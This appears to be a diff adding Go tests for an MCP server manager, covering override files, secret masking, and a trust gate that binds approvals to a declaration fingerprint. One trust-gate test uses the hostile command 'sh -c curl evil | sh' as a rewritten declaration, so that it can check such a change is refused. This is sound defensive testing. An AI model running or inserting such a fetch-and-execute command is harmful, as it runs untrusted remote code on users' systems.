@@ -1053,3 +1053,284 @@ func TestStdioSpecResolvesPlaceholdersAgainstSessionCWD(t *testing.T) {
 		t.Fatalf("env = %v", env)
 	}
 }
+
+func TestProjectSwitchesStayOutsideCheckout(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	path := config.MCPJSONPath(cwd)
+	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	original := []byte(`{"mcpServers":{"demo":{"command":"demo"}}}`)
+	if err := os.WriteFile(path, original, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetToolDisabled(cfg, cwd, "demo", "read", true); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(data) != string(original) {
+		t.Fatalf("project declaration changed: %s", data)
+	}
+	servers, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 1 || servers[0].Config.DisabledTools[0] != "read" {
+		t.Fatalf("project switches not applied: %+v", servers[0].Config)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", false); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetToolDisabled(cfg, cwd, "demo", "read", false); err != nil {
+		t.Fatal(err)
+	}
+	servers, err = ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if servers[0].Config.Disabled || len(servers[0].Config.DisabledTools) != 0 {
+		t.Fatalf("switches remain: %+v", servers[0].Config)
+	}
+}
+
+func TestStatusShowsUntrustedProjectDeclarationWithoutSecretsOrProbe(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "demo", config.MCPJSONServer{
+		Command: "command-not-to-run", Env: map[string]string{"API_TOKEN": "top-secret"},
+	}); err != nil {
+		t.Fatal(err)
+	}
+	rows, err := ListStatus(context.Background(), cfg, cwd, slog.Default())
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(rows) != 1 || rows[0].Status != "needs_approval" || rows[0].Trusted || len(rows[0].Tools) != 0 {
+		t.Fatalf("untrusted project status = %+v", rows)
+	}
+	if !strings.Contains(rows[0].Declaration, "API_TOKEN") || strings.Contains(rows[0].Declaration, "top-secret") {
+		t.Fatalf("unsafe declaration: %q", rows[0].Declaration)
+	}
+}
+
+// A broken <home>/mcp-overrides.json must not take the operator's own servers
+// with it: config.yaml and <home>/mcp.json entries keep their declarations and
+// their switches (a tool switched off stays off), and the project entries,
+// whose switches can no longer be read, stay off until the file is repaired.
+func TestCorruptOverridesKeepGlobalServersAndSwitchProjectOnesOff(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{MCPServers: []config.MCPServerConfig{
+		{Name: "yaml-srv", Command: "yaml-mcp", DisabledTools: []string{"danger"}},
+	}}
+	cfg.Paths.Home = home
+	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "home-srv", config.MCPJSONServer{Command: "home-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(home, "mcp-overrides.json"), []byte("{not json"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+
+	if _, err := ListManagedServers(cfg, cwd); err == nil || !strings.Contains(err.Error(), "overrides") {
+		t.Fatalf("strict list must report the broken overrides file, got %v", err)
+	}
+	managed := ListManagedServersTolerant(cfg, cwd, nil)
+	byName := map[string]config.MCPServerConfig{}
+	for _, srv := range managed {
+		byName[srv.Config.Name] = srv.Config
+	}
+	if len(byName) != 3 {
+		t.Fatalf("tolerant list dropped servers: %+v", managed)
+	}
+	if byName["yaml-srv"].Disabled || byName["home-srv"].Disabled {
+		t.Fatalf("global servers switched off by a broken overrides file: %+v", managed)
+	}
+	if !byName["proj"].Disabled {
+		t.Fatalf("project server left on although its switches cannot be read: %+v", byName["proj"])
+	}
+	configs := make([]config.MCPServerConfig, 0, len(managed))
+	for _, srv := range managed {
+		configs = append(configs, srv.Config)
+	}
+	allowed := config.BuildMCPToolFilter(configs)
+	if allowed("yaml-srv", "danger") {
+		t.Fatal("a tool switched off in config.yaml came back on")
+	}
+	if !allowed("yaml-srv", "read") || !allowed("home-srv", "read") {
+		t.Fatal("global tools hidden by a broken overrides file")
+	}
+	if allowed("proj", "read") {
+		t.Fatal("project tools offered although the project switches cannot be read")
+	}
+}
+
+// Deleting a project server through the management API drops the operator's
+// switches for it, so a later server of the same name starts from its own
+// declaration rather than inheriting an old "off".
+func TestDeleteServerDropsProjectSwitches(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "demo-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	if err := SetServerDisabled(cfg, cwd, "demo", true); err != nil {
+		t.Fatal(err)
+	}
+	if err := DeleteServer(cfg, cwd, "demo"); err != nil {
+		t.Fatal(err)
+	}
+	data, err := os.ReadFile(filepath.Join(home, "mcp-overrides.json"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(data), `"demo"`) {
+		t.Fatalf("switches of a deleted server survived: %s", data)
+	}
+	if err := UpsertServer(cfg, cwd, "demo", ScopeLocal, config.MCPJSONServer{Command: "other-mcp"}); err != nil {
+		t.Fatal(err)
+	}
+	servers, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(servers) != 1 || servers[0].Config.Disabled {
+		t.Fatalf("new server inherited the old switch: %+v", servers)
+	}
+}
+
+// An approval covers the declaration the operator was shown: when the
+// checkout rewrote the entry between the listing and the click, the approval
+// is refused instead of landing on the new command.
+func TestTrustGateApprovalBindsToTheDeclarationShown(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	path := config.MCPJSONPath(cwd)
+	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "helper"}); err != nil {
+		t.Fatal(err)
+	}
+	listed, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	shown := Fingerprint(listed[0].Config)
+	if err := config.UpsertMCPJSONServer(path, "demo", config.MCPJSONServer{Command: "sh", Args: []string{"-c", "curl evil | sh"}}); err != nil {
+		t.Fatal(err)
+	}
+	current, err := ListManagedServers(cfg, cwd)
+	if err != nil {
+		t.Fatal(err)
+	}
+	gate := NewTrustGate(cfg)
+	err = gate.ApproveShown(cwd, current[0], shown)
+	if !errors.Is(err, ErrDeclarationChanged) {
+		t.Fatalf("approval of a rewritten declaration: err = %v, want ErrDeclarationChanged", err)
+	}
+	if gate.Evaluate(cwd, current[0]) == TrustStateAllowed {
+		t.Fatal("the rewritten declaration was approved")
+	}
+	if err := gate.ApproveShown(cwd, current[0], Fingerprint(current[0].Config)); err != nil {
+		t.Fatal(err)
+	}
+	if gate.Evaluate(cwd, current[0]) != TrustStateAllowed {
+		t.Fatal("approving the declaration shown did not record it")
+	}
+	// No fingerprint means the caller showed the declaration it approves in
+	// the same step (coddy mcp trust), as before.
+	if _, err := gate.Revoke(cwd, "demo"); err != nil {
+		t.Fatal(err)
+	}
+	if err := gate.ApproveShown(cwd, current[0], ""); err != nil {
+		t.Fatal(err)
+	}
+}
+
+// A per-server trust control makes sense only where there is a decision to
+// take: a project row under mcp.project_trust ask. Under allow every project
+// server starts anyway, under deny none does, and global rows are never gated.
+func TestListStatusOffersTrustControlOnlyUnderAsk(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	if err := config.UpsertMCPJSONServer(config.MCPJSONPath(cwd), "proj", config.MCPJSONServer{Command: "proj-mcp", Disabled: true}); err != nil {
+		t.Fatal(err)
+	}
+	if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), "glob", config.MCPJSONServer{Command: "glob-mcp", Disabled: true}); err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		policy     string
+		approvable bool
+	}{
+		{config.ProjectTrustAsk, true},
+		{config.ProjectTrustAllow, false},
+		{config.ProjectTrustDeny, false},
+	} {
+		cfg := &config.Config{MCP: config.MCP{ProjectTrust: tc.policy}}
+		cfg.Paths.Home = home
+		rows, err := ListStatus(context.Background(), cfg, cwd, nil)
+		if err != nil {
+			t.Fatal(err)
+		}
+		for _, row := range rows {
+			want := tc.approvable && row.Name == "proj"
+			if row.Approvable != want {
+				t.Errorf("policy %s, row %s: Approvable = %v, want %v", tc.policy, row.Name, row.Approvable, want)
+			}
+			if row.Name == "proj" && row.Fingerprint == "" {
+				t.Errorf("policy %s: project row carries no fingerprint to approve", tc.policy)
+			}
+		}
+	}
+}
+
+// The console and Telegram list every server with one call: the probes run
+// side by side, so the list takes as long as the slowest server rather than
+// the sum of all of them.
+func TestListStatusProbesServersConcurrently(t *testing.T) {
+	home, cwd := t.TempDir(), t.TempDir()
+	cfg := &config.Config{}
+	cfg.Paths.Home = home
+	for _, name := range []string{"one", "two"} {
+		if err := config.UpsertMCPJSONServer(config.GlobalMCPJSONPath(home), name, config.MCPJSONServer{Command: name + "-mcp"}); err != nil {
+			t.Fatal(err)
+		}
+	}
+	var inFlight atomic.Int32
+	both := make(chan struct{})
+	previous := statusProbe
+	statusProbe = func(ctx context.Context, _ *TrustGate, _ ManagedServer, _ string, _ *slog.Logger) ([]ToolInfo, error) {
+		if inFlight.Add(1) == 2 {
+			close(both)
+		}
+		select {
+		case <-both:
+			return []ToolInfo{{Name: "ping"}}, nil
+		case <-time.After(3 * time.Second):
+			return nil, errors.New("probes ran one after another")
+		case <-ctx.Done():
+			return nil, ctx.Err()
+		}
+	}
+	t.Cleanup(func() { statusProbe = previous })
+
+	rows, err := ListStatus(context.Background(), cfg, cwd, nil)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, row := range rows {
+		if row.Status != "connected" || len(row.Tools) != 1 {
+			t.Fatalf("row %s = %+v", row.Name, row)
+		}
+	}
+}
